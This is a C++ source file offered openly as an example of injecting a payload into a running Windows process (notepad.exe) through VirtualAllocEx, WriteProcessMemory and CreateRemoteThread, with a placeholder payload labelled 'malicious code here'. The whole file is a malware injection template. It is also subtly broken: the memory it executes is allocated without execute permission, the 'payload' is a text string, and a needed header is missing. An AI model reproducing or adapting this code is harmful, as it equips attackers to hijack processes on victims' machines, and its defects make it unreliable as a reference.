#include <windows.h>
#include <iostream>

//example code snippet that demonstrates how to use the functions to inject a payload into a target process

int main()
{
    // Define the target process name and payload buffer
    const char* target_process_name = "notepad.exe";
    const char* payload = "malicious code here";

    // Get the process ID of the target process
    DWORD target_pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(snapshot, &pe))
        {
            do
            {
                if (_stricmp(pe.szExeFile, target_process_name) == 0)
                {
                    target_pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &pe));
        }
        CloseHandle(snapshot);
    }

    // Open a handle to the target process with read, write, and execute permissions
    HANDLE target_handle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, target_pid);
    if (target_handle == NULL)
    {
        std::cout << "Failed to open handle to target process.\n";
        return 1;
    }

    // Allocate memory in the target process
    LPVOID remote_memory = VirtualAllocEx(target_handle, NULL, strlen(payload), MEM_COMMIT, PAGE_READWRITE);
    if (remote_memory == NULL)
    {
        std::cout << "Failed to allocate memory in target process.\n";
        CloseHandle(target_handle);
        return 1;
    }

    // Write the payload to the allocated memory
    if (!WriteProcessMemory(target_handle, remote_memory, payload, strlen(payload), NULL))
    {
        std::cout << "Failed to write payload to target process memory.\n";
        VirtualFreeEx(target_handle, remote_memory, strlen(payload), MEM_RELEASE);
        CloseHandle(target_handle);
        return 1;
    }

    // Create a remote thread to execute the payload
    HANDLE remote_thread = CreateRemoteThread(target_handle, NULL, 0, (LPTHREAD_START_ROUTINE)remote_memory, NULL, 0, NULL);
    if (remote_thread == NULL)
    {
        std::cout << "Failed to create remote thread in target process.\n";
        VirtualFreeEx(target_handle, remote_memory, strlen(payload), MEM_RELEASE);
        CloseHandle(target_handle);
        return 1;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(remote_thread, INFINITE);

    // Free the allocated memory and close the process handle
    VirtualFreeEx(target_handle, remote_memory, strlen(payload), MEM_RELEASE);
    CloseHandle(target_handle);

    return 0;
}
